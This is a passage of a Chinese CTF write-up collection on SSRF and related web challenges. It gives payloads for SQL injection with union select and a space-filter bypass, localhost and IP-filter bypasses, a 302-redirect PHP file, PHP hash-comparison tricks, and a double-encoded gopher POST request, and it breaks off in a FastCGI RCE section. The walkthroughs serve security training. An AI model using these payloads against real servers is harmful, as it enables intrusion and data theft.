$this-&gt;blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this-&gt;get($this-&gt;blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this-&gt;blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n</code></pre> <p>\u91cd\u70b9\u662f\u8fd9\u6bb5\u4ee3\u7801\uff0c\u5148\u521d\u59cb\u5316 cURL \u4f1a\u8bdd\u5e76\u8fd4\u56de\u4e00\u4e2a cURL \u53e5\u67c4</p> <p>\u8bbe\u7f6e cURL \u9009\u9879\uff0c\u6307\u5b9a\u8981\u8bf7\u6c42\u7684 URL\uff0c1 \u8868\u793a\u5f00\u542f\u6267\u884c curl_exec() \u65f6</p> <p>\u8fd4\u56de\u54cd\u5e94\u5185\u5bb9\u800c\u4e0d\u662f\u76f4\u63a5\u8f93\u51fa\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728 SSRF \u6f0f\u6d1e</p> <pre><code>function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n</code></pre> <p>\u56de\u5934\u53bb\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7</p> <p></p> <p>\u770b\u5230\u540d\u5b57\u662f\u84dd\u8272\u7684\uff0c\u70b9\u51fb</p> <p></p> <p>\u6765\u7684\u4e00\u4e2a\u65b0\u9875\u9762\uff0c\u6ce8\u610f URL \u53c2\u6570\u6709\u4e00\u4e2a no</p> <p></p> <p>\u6539\u4e3a 2 \u5c45\u7136\u62a5\u9519\u4e86</p> <p></p> <p>\u52a0\u4e00\u4e2a ' \u62a5\u6570\u636e\u5e93\u7684\u9519\u8bef\uff0c\u90a3\u8fd9\u91cc\u5c31\u5b58\u5728 SQL \u6ce8\u5165\uff0c\u52a0\u4e86\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u90fd\u76f8\u540c\u7684\u9519\u8bef</p> <p></p> <p>\u4e0d\u52a0\u5f15\u53f7\u76f4\u63a5 or 1=1 # \u56de\u663e\u6b63\u5e38</p> <p></p> <p>order by 5 \u62a5\u9519\uff0c\u518d\u6b21\u6d4b\u8bd5 4 \u6ca1\u6709\u62a5\u9519\uff0c\u8bf4\u660e\u53ea\u6709 4 \u5217</p> <p></p> <p>\u76f4\u63a5 -1 union select 1,2,3,4 # \u88ab\u8fc7\u6ee4\u7a7a\u683c\u5e94\u8be5\u662f</p> <p></p> <p>\u4f7f\u7528 /**/ \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7</p> <p></p> <p>\u63a5\u4e0b\u6765\u7206\u5e93\u3001\u8868\u3001\u5b57\u6bb5</p> <p></p> <p>\u6700\u540e\u53d1\u73b0 data \u662f\u4e2a\u5e8f\u5217\u5316\u7684\u503c</p> <p></p> <p>\u7ed3\u5408\u4e4b\u524d\u7684\u5907\u4efd\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e blog \u4e3a file \u4f2a\u534f\u8bae\u6765\u8bfb\u53d6 flag \u6587\u4ef6\uff0c\u7136\u540e\u53cd\u5e8f\u5217\u5316\u4f20\u5165\u5230\u7b2c\u56db\u4e2a\u5b57\u6bb5</p> <p></p> <p>\u6784\u9020 payload \u6267\u884c</p> <p></p> <p>\u53f3\u952e\u67e5\u770b\u6e90\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u6587\u4ef6</p> <p></p> <p>\u6253\u5f00\u518d\u67e5\u770b\u6e90\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter15/15-10/","title":"\u6307\u5b9a\u57df\u540d\u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-10/#\u6307\u5b9a\u57df\u540d\u7ed5\u8fc7","title":"@\u6307\u5b9a\u57df\u540d\u7ed5\u8fc7","text":"<p>\u7ed9\u51fa\u63d0\u793a\uff0cURL \u53c2\u6570\u7684\u503c\u4e2d\u5fc5\u987b\u5305\u542b\u6709 <code>http://notfound.ctfhub.com</code></p> <p>\u53ef\u4ee5\u91c7\u7528 @\uff0c\u4e5f\u5c31\u662f  HTTP  \u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7</p> <p>HTTP \u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u5141\u8bb8 Web \u6d4f\u89c8\u5668\u6216\u5176\u4ed6\u5ba2\u6237\u7aef\u7a0b\u5e8f\u5728\u8bf7\u6c42\u65f6\u63d0\u4f9b\u7528\u6237\u540d\u548c\u53e3\u4ee4\u5f62\u5f0f\u7684\u8eab\u4efd\u51ed\u8bc1\u7684\u4e00\u79cd\u767b\u5f55\u9a8c\u8bc1\u65b9\u5f0f</p> <p>\u4e5f\u5c31\u662f\uff1a<code>http://www.xxx.com@www.yyy.com</code>  \u5f62\u5f0f</p> <pre><code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php\n</code></pre> <p></p>"},{"location":"Web/Chapter15/15-11/","title":"IP \u8f6c\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-11/#ip-\u8f6c\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7","title":"IP \u8f6c\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7","text":"<p>\u5c1d\u8bd5\u5c06 <code>127.0.0.1</code> \u8f6c\u6362\u4e3a**\u5341\u516d\u8fdb\u5236**\u5f62\u5f0f\uff0c\u4e5f\u5c31\u662f <code>0x7f000001</code></p> <p>\u6784\u9020\u9898\u76ee\u6709\u6240\u9700 Payload\uff1a<code>?url=0x7f000001/flag.php</code></p> <p></p>"},{"location":"Web/Chapter15/15-12/","title":"localhost \u4ee3\u66ff IP \u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-12/#localhost-\u4ee3\u66ff-ip-\u7ed5\u8fc7","title":"localhost \u4ee3\u66ff IP \u7ed5\u8fc7","text":"<p>\u4f7f\u7528 <code>localhost</code> \u4ee3\u66ff <code>127.0.0.1</code> \u7ed5\u8fc7</p> <p></p>"},{"location":"Web/Chapter15/15-13/","title":"DNS \u91cd\u7ed1\u5b9a\u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-13/#dns-\u91cd\u7ed1\u5b9a\u7ed5\u8fc7","title":"DNS \u91cd\u7ed1\u5b9a\u7ed5\u8fc7","text":"<p>\ud83d\udd0d \u4ec0\u4e48\u662f DNS \u91cd\u7ed1\u5b9a\uff08DNS Rebinding\uff09\uff1f</p> <p>DNS \u91cd\u7ed1\u5b9a\u662f\u4e00\u79cd\u653b\u51fb\u624b\u6cd5\uff0c\u901a\u8fc7\u64cd\u63a7\u57df\u540d\u89e3\u6790\u7ed3\u679c\uff0c\u4f7f\u6d4f\u89c8\u5668\u8bbf\u95ee\u539f\u672c\u53d7\u540c\u6e90\u7b56\u7565\u4fdd\u62a4\u7684\u5185\u7f51\u5730\u5740\u6216\u672c\u5730\u670d\u52a1</p> <p>\u653b\u51fb\u8005\u6ce8\u518c\u4e00\u4e2a\u57df\u540d \u2192 \u5229\u7528 DNS \u63a7\u5236\u57df\u540d\u89e3\u6790\u7ed3\u679c \u2192 \u6d4f\u89c8\u5668\u8ba4\u4e3a\u662f\u540c\u6e90 \u2192 \u8bbf\u95ee\u53d7\u4fdd\u62a4\u8d44\u6e90</p> <p>\ud83e\udde0 \u653b\u51fb\u6d41\u7a0b\u7b80\u56fe</p> <pre><code>\u53d7\u5bb3\u8005\u6d4f\u89c8\u5668\u8bbf\u95ee attacker.com\n        \u2193\n\u7b2c\u4e00\u6b21 DNS \u8fd4\u56de attacker.com \u2192 1.2.3.4\uff08\u653b\u51fb\u8005\u670d\u52a1\u5668\uff09\n        \u2193\n\u6d4f\u89c8\u5668\u52a0\u8f7d\u6076\u610f\u811a\u672c\n        \u2193\n\u7b2c\u4e8c\u6b21 DNS \u8fd4\u56de attacker.com \u2192 127.0.0.1 / \u5185\u7f51 IP\n        \u2193\n\u811a\u672c\u5229\u7528\u540c\u6e90\u7b56\u7565\u8bbf\u95ee\u672c\u5730/\u5185\u7f51\u670d\u52a1\n</code></pre> <p>\u6253\u5f00\u7f51\u7ad9</p> <p></p> <p>\u590d\u5236\u4e0b\u9762\u90a3\u5757\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter15/15-2/","title":"\u57df\u540d\u4ee3\u66ff IP \u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-2/#\u57df\u540d\u4ee3\u66ff-ip-\u7ed5\u8fc7","title":"\u57df\u540d\u4ee3\u66ff IP \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u4e0d\u8ba9 F12 \u4ee5\u53ca\u53f3\u952e</p> <p></p> <p>Ctrl + U \u53d1\u73b0\u6709\u4e2a PHP \u6587\u4ef6</p> <p></p> <p>\u8bbf\u95ee\u9875\u9762\u540e\u518d\u6b21\u67e5\u770b\u6e90\u7801\u7ed9\u51fa\u4e86\u63d0\u793a</p> <p></p> <p>\u5b89\u88c5\u5de5\u5177</p> <pre><code>pip install arjun\n</code></pre> <p></p> <p>\u6267\u884c\u547d\u4ee4</p> <pre><code>arjun -u http://challenge.qsnctf.com:31303/c3s4f.php\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u6709\u4e2a <code>shell</code> \u53c2\u6570</p> <p></p> <p>\u4f20\u5165\u53c2\u6570\u7ed9\u51fa\u4e86\u65b0\u63d0\u793a</p> <p></p> <p>\u626b\u63cf\u76ee\u5f55\u53d1\u73b0\u6709\u4e2a <code>secret.php</code></p> <p></p> <p>\u53ea\u5141\u8bb8\u672c\u5730\u8bbf\u95ee</p> <p></p> <p>\u7ed3\u5408\u63d0\u793a\u4ee5\u4e3a\u662f\u8981\u4f2a\u9020 XFF \u6216\u8005 Client-IP\uff0c\u8bd5\u8fc7\u4e86\u90fd\u4e0d\u884c</p> <p>\u5229\u7528 <code>shell</code> \u53c2\u6570\u6784\u9020 SSRF</p> <pre><code>?shell=http://127.0.0.1/secret.php\n</code></pre> <p>\u65e0\u679c</p> <p></p> <p>\u4f7f\u7528\u57df\u540d\u8df3\u8f6c\u7ed5\u8fc7</p> <pre><code>?shell=http://localtest.me/secret.php\n</code></pre> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u6e90\u7801</p> <p></p> <pre><code>&lt;?php\nshow_source(__FILE__);\ninclude('k4y.php');\ninclude_once('flag.php');\n\n\n// Challenge 1\nif (isset($_GET['DrKn'])) {\n    $text = $_GET['DrKn'];\n    if(@file_get_contents($text) == $key) {\n        echo \"\u6709\u70b9\u4e1c\u897f\u5462\".\"&lt;/br&gt;\".$key1.\"&lt;/br&gt;\";\n    } else {\n        die(\"\u8c8c\u4f3c\u72b6\u6001\u4e0d\u5728\u7ebf\u554a(\u256f_\u2570)&lt;/br&gt;\");\n    }\n} \n\n\n// Challenge 2\nif (isset($_GET[$key1])) {\n    $damei = $_GET[$key1];\n    if (hash(\"md4\", $damei) == $damei) {\n        echo \"\u53c8\u8fd1\u4e86\u4e00\u6b65\u5462\uff0c\u5b9d~\".\"&lt;/br&gt;\".$key2.\"&lt;/br&gt;\".$key3;\n    } else {\n        die(\"\u8fbe\u54a9\u54df~\");\n    }\n} \n\n\n// Challenge 3\nif (isset($_POST[$key2]) &amp;&amp; isset($_POST[$key3])) {\n    $user = $_POST[$key2];\n    $pass = $_POST[$key3];\n\n    if (strlen($user) &gt; 4 || strlen($pass) &gt; 5) {\n          die(\"\u8fd8\u5f97\u7ec3\");\n      }\n     if ($user !== $pass &amp;&amp; md5($user) === md5($pass)) {  \n          echo \"\u8fd8\u4e0d\u9519\u54e6\".\"$flag\";\n      }\n      else {\n          die(\"nonono\") ;\n      }\n    }\n\n?&gt;\n</code></pre> <p>\u7b2c\u4e00\u5173\u5c31\u662f\u4f20\u5165\u7ed9\u51fa\u7684 Key\uff0c\u4f46\u662f\u9700\u8981\u7528\u5230 <code>data</code> \u4f2a\u534f\u8bae</p> <p></p> <p>\u7b2c\u4e8c\u5173\u662f\u4e00\u4e2a <code>md4</code> \u7684\u5f31\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u5176\u5b9e\u53ef\u4ee5\u901a\u8fc7\u79d1\u5b66\u8ba1\u7b97\u6cd5\u6bd4\u8f83\u7ed5\u8fc7</p> <p>\u4e5f\u5c31\u662f\u8bf4\u8981\u627e\u4e00\u4e2a\u660e\u6587\u662f\u4e00\u4e2a\u79d1\u5b66\u8ba1\u7b97\u6cd5 0e \u5f00\u5934\u7684\uff0c\u7136\u540e\u5176\u52a0\u5bc6\u4e5f\u662f 0e \u5f00\u5934\u540e\u9762\u90fd\u662f\u6570\u5b57</p> <pre><code>&amp;M_ore.8=0e001233333333333334557778889\n</code></pre> <p>\u6700\u540e\u4e00\u5173\u5c31\u662f <code>md5</code> \u5f3a\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u90fd\u4e3a\u6570\u7ec4\u5373\u53ef</p> <p></p>"},{"location":"Web/Chapter15/15-3/","title":"302 \u8df3\u8f6c\u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-3/#302-\u8df3\u8f6c\u7ed5\u8fc7","title":"302 \u8df3\u8f6c\u7ed5\u8fc7","text":"<p>\u8bbf\u95ee\u73af\u5883\u65f6\u663e\u793a url \u4e0d\u5b58\u5728</p> <p></p> <p>\u6784\u9020 url \u6d4b\u8bd5</p> <p></p> <p></p> <p>\u53d1\u73b0\u53ef\u4ee5\u8bbf\u95ee\u767e\u5ea6\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\u8bf4</p> <p></p> <p>\u6211\u4eec\u5c31\u8bbf\u95ee\u5bb9\u5668\u5185\u90e8\u7684 8000 \u7aef\u53e3\uff0c\u4f46\u662f\u6709\u8fc7\u6ee4 <code>127.0.0.1</code> \u53ca <code>loaclhost</code></p> <p>\u5229\u7528\u670d\u52a1\u5668\u6784\u9020 302 \u8df3\u8f6c\u7ed5\u8fc7</p> <p>\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u6784\u5efa <code>302.php</code></p> <pre><code>url=http://{your_server}/302.php\n</code></pre> <pre><code>&lt;?php\nheader(\"location: http://127.0.0.1:8000/api/internal/secret\")\n?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter15/15-4/","title":"127.0.0.x \u4ee3\u66ff IP \u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-4/#12700x-\u4ee3\u66ff-ip-\u7ed5\u8fc7","title":"127.0.0.x \u4ee3\u66ff IP \u7ed5\u8fc7","text":"<p>\u8bbf\u95ee\u73af\u5883\u65f6\u663e\u793a url \u4e0d\u5b58\u5728</p> <p></p> <p>\u6784\u9020 url \u6d4b\u8bd5</p> <p></p> <p></p> <p>\u53d1\u73b0\u53ef\u4ee5\u8bbf\u95ee\u767e\u5ea6\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\u8bf4</p> <p></p> <p>\u6211\u4eec\u5c31\u8bbf\u95ee\u5bb9\u5668\u5185\u90e8\u7684 8000 \u7aef\u53e3\uff0c\u4f46\u662f\u6709\u8fc7\u6ee4 <code>127.0.0.1</code> \u53ca <code>loaclhost</code></p> <p>\u91c7\u7528 <code>127.0.0.x</code> \u7684\u5f62\u5f0f\u7ed5\u8fc7\uff0cx \u4e3a <code>2~255</code></p> <p></p>"},{"location":"Web/Chapter15/15-5/","title":"0.0.0.0 \u4ee3\u66ff IP \u7ed5\u8fc7","text":""},{"location":"Web/Chapter15/15-5/#0000-\u4ee3\u66ff-ip-\u7ed5\u8fc7","title":"0.0.0.0 \u4ee3\u66ff IP \u7ed5\u8fc7","text":"<p>\u8bbf\u95ee\u73af\u5883\u65f6\u663e\u793a url \u4e0d\u5b58\u5728</p> <p></p> <p>\u6784\u9020 url \u6d4b\u8bd5</p> <p></p> <p></p> <p>\u53d1\u73b0\u53ef\u4ee5\u8bbf\u95ee\u767e\u5ea6\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\u8bf4</p> <p></p> <p>\u6211\u4eec\u5c31\u8bbf\u95ee\u5bb9\u5668\u5185\u90e8\u7684 8000 \u7aef\u53e3\uff0c\u4f46\u662f\u6709\u8fc7\u6ee4 <code>127.0.0.1</code> \u53ca <code>loaclhost</code></p> <p>\u91c7\u7528 <code>0.0.0.0</code> \u7684\u5f62\u5f0f\u7ed5\u8fc7</p> <p></p>"},{"location":"Web/Chapter15/15-6/","title":"\u7aef\u53e3\u626b\u63cf","text":""},{"location":"Web/Chapter15/15-6/#\u7aef\u53e3\u626b\u63cf","title":"\u7aef\u53e3\u626b\u63cf","text":"<p>url \u53c2\u6570\u5b58\u5728 SSRF \u6f0f\u6d1e</p> <p></p> <p>\u4f7f\u7528 BurpSuite \u6293\u5305\u904d\u5386\u7aef\u53e3\u505a\u626b\u63cf</p> <p></p> <p>8255 \u957f\u5ea6\u4e0d\u4e00\u6837\uff0c\u63a8\u6d4b\u7aef\u53e3\u5f00\u7740\u7684\uff0c\u770b\u54cd\u5e94\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter15/15-7/","title":"gopher \u534f\u8bae\u4f2a\u9020 HTTP \u8bf7\u6c42","text":""},{"location":"Web/Chapter15/15-7/#gopher-\u534f\u8bae\u4f2a\u9020-http-\u8bf7\u6c42","title":"gopher \u534f\u8bae\u4f2a\u9020 HTTP \u8bf7\u6c42","text":"<p>\u8001\u6837\u5b50\u76f4\u63a5\u8bbf\u95ee <code>127.0.0.1/flag.php</code>\uff0c\u56de\u663e\u4e00\u4e2a\u8f93\u5165\u6846</p> <p></p> <p>\u67e5\u770b\u6e90\u7801\u62ff\u5230\u4e00\u4e2a Key \u503c</p> <p></p> <p>\u8f93\u5165\u540e\u56de\u8f66\uff0c\u63d0\u793a\u4ec5\u9650 <code>127.0.0.1</code> \u67e5\u770b</p> <p></p> <p>\u6211\u4eec\u5c1d\u8bd5\u7528 file:// \u8bfb\u53d6\u6587\u4ef6,\u5f97\u5230\u5982\u4e0b\u4ee3\u7801\uff1a</p> <pre><code>?url=file:///var/www/html/index.php\n</code></pre> <pre><code>&lt;?php\n\nerror_reporting(0);\n\nif (!isset($_REQUEST['url'])){\n    header(\"Location: /?url=_\");\n    exit;\n}\n\n// \u521d\u59cb\u5316 cURL\uff0c\u8fd9\u662f PHP \u63d0\u4f9b\u7684\u4e00\u4e2a\u53d1\u8d77 HTTP \u8bf7\u6c42\u7684\u5e93\uff0c\u5e95\u5c42\u53ef\u4ee5\u53d1\u8d77 HTTP\u3001HTTPS\u3001FTP\u3001gopher \u7b49\u534f\u8bae\u7684\u8bf7\u6c42\n$ch = curl_init();\n\n// \u5c06\u7528\u6237\u4f20\u5165\u7684 url \u53c2\u6570\u76f4\u63a5\u4f20\u7ed9 cURL \u8bf7\u6c42\u76ee\u6807\ncurl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);\n\n// CURLOPT_HEADER: 0 \u4e0d\u8fd4\u56de\u54cd\u5e94\u5934\ncurl_setopt($ch, CURLOPT_HEADER, 0);\n\n// CURLOPT_FOLLOWLOCATION, 1: \u5982\u679c\u76ee\u6807\u8fd4\u56de 3xx \u8df3\u8f6c\uff0ccURL \u4f1a\u81ea\u52a8\u8ddf\u968f\u8df3\u8f6c\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n\n// \u6267\u884c\u8bf7\u6c42\ncurl_exec($ch);\n\n// \u5173\u95ed\u8fde\u63a5\uff0c\u91ca\u653e\u8d44\u6e90\ncurl_close($ch);\n</code></pre> <p>\u518d\u8bfb\u53d6 <code>flag.php</code> \u7684</p> <pre><code>?url=file:///var/www/html/flag.php\n</code></pre> <pre><code>&lt;?php\n\n// \u5173\u95ed\u6240\u6709\u9519\u8bef\u62a5\u544a\uff0c\u9632\u6b62\u6cc4\u9732\u654f\u611f\u4fe1\u606f\nerror_reporting(0);\n\n// \u5224\u65ad\u8bf7\u6c42\u6765\u6e90 IP \u662f\u5426\u4e3a\u672c\u5730\u5730\u5740 127.0.0.1\nif ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") {\n    // \u5982\u679c\u4e0d\u662f\u672c\u5730\u8bbf\u95ee\uff0c\u76f4\u63a5\u63d0\u793a\u5e76\u7ec8\u6b62\u811a\u672c\n    echo \"Just View From 127.0.0.1\";\n    return;\n}\n\n// \u4ece\u73af\u5883\u53d8\u91cf\u4e2d\u83b7\u53d6 flag\uff08\u4e00\u822c\u5728\u9776\u573a\u73af\u5883\u4e2d\u8bbe\u7f6e\uff09\n$flag = getenv(\"CTFHUB\");\n\n// \u5bf9 flag \u505a MD5 \u54c8\u5e0c\uff0c\u5f97\u5230 key\n$key = md5($flag);\n\n// \u5224\u65ad\u7528\u6237\u662f\u5426\u901a\u8fc7 POST \u63d0\u4ea4\u4e86 \"key\"\uff0c\u5e76\u4e14\u503c\u4e0e\u670d\u52a1\u5668\u8ba1\u7b97\u7684 $key \u76f8\u540c\nif (isset($_POST[\"key\"]) &amp;&amp; $_POST[\"key\"] == $key) {\n    // \u5982\u679c\u63d0\u4ea4\u6b63\u786e\uff0c\u8fd4\u56de flag\n    echo $flag;  // \u5f53 post \u4f20\u503c\u4e3a key \u65f6\u51fa flag\n    exit;\n}\n?&gt;\n\n&lt;!-- \u7b80\u5355\u7684 HTML \u8868\u5355\uff0c\u5141\u8bb8\u7528\u6237\u63d0\u4ea4 key --&gt;\n&lt;form action=\"/flag.php\" method=\"post\"&gt;\n&lt;input type=\"text\" name=\"key\"&gt;\n&lt;!-- Debug \u4fe1\u606f\uff1a\u5c06\u670d\u52a1\u5668\u7aef\u8ba1\u7b97\u7684 key \u663e\u793a\u5728\u9875\u9762\u4e0a\uff08\u65b9\u4fbf\u5f00\u53d1\u8005\u8c03\u8bd5\uff0c\u6b63\u5e38\u5e94\u5220\u9664\uff09 --&gt;\n&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;\n&lt;/form&gt;\n</code></pre> <p>\u6211\u4eec\u77e5\u9053\u53ea\u8981\u5f80 <code>flag.php</code> \u4f20 key \u503c\u5c31\u53ef\u4ee5\u5f97\u5230 flag</p> <p>\u800c <code>index.php</code> \u53ef\u4ee5\u5229\u7528 curl \u4f20 url</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u7528 gopher \u534f\u8bae\u5728 <code>index.php</code> \u4e2d\u6784\u9020 POST \u8bf7\u6c42\u5305\u5f80 <code>flag.php</code> \u4f20 Key \u503c\uff0c\u4ee5\u6b64\u83b7\u53d6 flag</p> <p>\u6240\u4ee5\u6211\u4eec\u901a\u8fc7 gopher \u534f\u8bae\u6784\u9020\u4e00\u4e2a\u8bf7\u6c42\uff0c\u914d\u5408 SSRF \u6a21\u62df\u6210\u5185\u7f51\u7528\u6237\u53bb\u8bbf\u95ee\u63d0\u4ea4\u6570\u636e</p> <p>\u6784\u9020\u8fd9\u6837\u7684\u4e00\u4e2a\u8bf7\u6c42</p> <p></p> <p>\u76f4\u63a5 curl \u540e\u63a5 gopher \u534f\u8bae\u5c31\u5148 URL \u7f16\u7801\u4e00\u6b21</p> <p>\u5173\u952e\u7684\u6362\u884c\u7b26\u662f CRLF\uff08\\r\\n\uff09\uff0c\u800c\u4e0d\u662f LF\uff08\\n\uff09\u5355\u72ec\u4f7f\u7528</p> <p>\u56e0\u4e3a gopher:// \u534f\u8bae\u662f**\u6a21\u62df\u539f\u59cb TCP \u5b57\u8282\u6d41**\uff0c\u800c HTTP \u7684\u534f\u8bae\u62a5\u6587\u6362\u884c\u662f <code>\\r\\n</code>\uff0c\u4e0d\u80fd\u53ea\u7528 <code>\\n</code></p> <p>\u5148\u628a\u6362\u884c <code>\\r\\n</code> \u5199\u6210 \u767e\u5206\u53f7\u7f16\u7801\uff08url encode\uff09\uff1a</p> <ul> <li><code>\\r</code> =&gt; <code>%0D</code></li> <li><code>\\n</code> =&gt; <code>%0A</code></li> </ul> <p>\u4e8e\u662f\u53d8\u6210\uff1a</p> <pre><code>POST%20/flag.php%20HTTP/1.1%0D%0A\nHost:%20127.0.0.1:80%0D%0A\nContent-Type:%20application/x-www-form-urlencoded%0D%0A\nContent-Length:%2036%0D%0A\n%0D%0A\nkey=a840f3c56810783306b3a75f861bd31a\n</code></pre> <p>\u6211\u8fd9\u91cc\u601d\u8def\u662f\u5148\u8df3\u5230\u5185\u7f51\u7684 <code>index.php</code> \u4e2d\u518d\u4f20\u5165 POST \u8bf7\u6c42</p> <p>\u6240\u4ee5\u8981 URL \u7f16\u7801\u4e24\u6b21\uff08\u5728\u5411\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u65f6\uff0c\u9996\u5148\u6d4f\u89c8\u5668\u4f1a\u8fdb\u884c\u4e00\u6b21 URL\u89e3\u7801\uff0c\u56e0\u4e3a\u6709\u4e24\u4e2a ?url\uff0c\u6240\u4ee5\u4f1a\u89e3\u7801\u4e24\u6b21\uff0c\u5176\u6b21\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5728\u6267\u884c <code>curl</code> \u529f\u80fd\u65f6\uff0c\u8fdb\u884c\u7b2c\u4e09\u6b21 URL\u89e3\u7801\uff09</p> <p>\u6700\u7ec8\u4f7f\u7528 gopher \u534f\u8bae + \u7aef\u53e3\u4f2a\u9020\u8bf7\u6c42\uff1a</p> <pre><code>?url=gopher://127.0.0.1:80/_\n# _ \u8868\u793a\u4e4b\u540e\u5f00\u59cb\u662f \u539f\u59cb TCP payload\n</code></pre> <p>\u6700\u7ec8 payload\uff1a</p> <pre><code>?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c\n</code></pre> <p></p>"},{"location":"Web/Chapter15/15-8/","title":"FastCGI \u534f\u8bae RCE","text":""},{"location":"Web/Chapter15/15-8/#fastcgi-\u534f\u8bae-rce","title":"FastCGI \u534f\u8bae RCE","text":"<p>1\ufe0f\u20e3 FastCGI \u7b80\u4ecb</p> <p>FastCGI \u662f\u4e00\u79cd\u7528\u4e8e\u52a0\u901f Web \u4e0e\u540e\u7aef\u7a0b\u5e8f\uff08\u5982 PHP-FPM\uff09\u901a\u4fe1\u7684\u534f\u8bae\uff0c\u5e38\u89c1\u7aef\u53e3 <code>9000</code></p> <p>\u5982\u679c\u670d\u52a1\u5668\u9519\u8bef\u66b4\u9732\u4e86 FastCGI \u670d\u52a1\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u534f\u8bae\u8bf7\u6c42\uff0c\u8ba9 PHP \u76f4\u63a5\u89e3\u91ca\u4efb\u610f\u6587\u4ef6\u6216\u6267\u884c\u6076\u610f\u4ee3\u7801</p> <p>2\ufe0f\u20e3 SSRF \u6253 FastCGI \u7684\u6838\u5fc3\u539f\u7406</p> <p>\u5229\u7528 SSRF \u8bf7\u6c42\u5185\u7f51 <code>127.0.0.1:9000</code> \u6216\u5176\u4ed6 PHP-FPM \u5730\u5740\uff0c\u901a\u8fc7 gopher:// \u4f2a\u9020 FastCGI \u4e8c\u8fdb\u5236\u534f\u8bae\u6570\u636e\u5305\uff0c\u8ba9\u670d\u52a1\u5668\u89e3\u6790\u6307\u5b9a\u6587\u4ef6\u6216\u6076\u610f payload</p> <p>\u6548\u679c\uff1a</p> <ul> <li>\u89e3\u6790\u4efb\u610f\u672c\u5730 <code>.php</code> \u6587\u4ef6\uff08\u4efb\u610f\u6587\u4ef6\u5305\u542b\u6548\u679c\uff09</li> <li>\u914d\u5408\u53ef\u63a7\u65e5\u5fd7\u6216 Session \u5199\u5165\u6076\u610f PHP \u4ee3\u7801\u5b9e\u73b0 RCE</li> </ul> <p>3\ufe0f\u20e3 \u5178\u578b\u5229\u7528\u6d41\u7a0b</p> \u6b65\u9aa4 \u52a8\u4f5c 1\ufe0f\u20e3 SSRF\uff08gopher\uff09\u6253\u672c\u5730 9000 \u7aef\u53e3 2\ufe0f\u20e3 \u4f2a\u9020 FastCGI \u8bf7\u6c42\uff0c\u6307\u5b9a <code>SCRIPT_FILENAME</code> \u6307\u5411\u65e5\u5fd7\u3001session\u3001/proc/self/environ \u7b49\u53ef\u4ee5\u4f2a\u9020\u5185\u5bb9\u7684\u5730\u65b9 3\ufe0f\u20e3 \u8ba9 PHP-FPM \u6267\u884c\u6076\u610f\u4ee3\u7801 4\ufe0f\u20e3 \u6210\u529f\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c <p>\u672c\u6587\u8981\u5229\u7528\u4e00\u4e2a\u811a\u672c gopherus.py\uff0c\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u5bf9 SSRF 